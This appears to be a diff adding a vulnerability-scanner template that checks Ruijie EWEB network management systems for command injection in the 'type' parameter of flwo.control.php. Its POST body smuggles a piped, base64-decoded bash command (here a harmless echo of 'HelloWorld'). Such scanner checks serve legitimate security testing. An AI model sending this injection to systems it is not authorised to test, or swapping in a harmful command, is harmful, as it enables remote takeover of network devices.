@@ -1,0 +1,39 @@
+id: ruijie-eweb-command-execution
+info:
+  name: Ruijie EWEB Network Management System Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Ruijie EWEB Network Management System is vulnerable due to improper input validation in the `type` parameter of `flwo.control.php`. This allows attackers to execute arbitrary commands on the server side.
+  reference:
+    - https://www.ruijie.com.cn
+  tags:
+    - command-execution
+    - rce
+    - ruijie
+
+http:
+  - raw:
+      - |
+        POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: {{cookie}}
+
+        type=|bash -c 'echo {{base64("echo HelloWorld")}} | base64 -d | bash && exit 0'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "HelloWorld"
+        part: body
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        regex:
+          - "Set-Cookie: ([^;]+);"
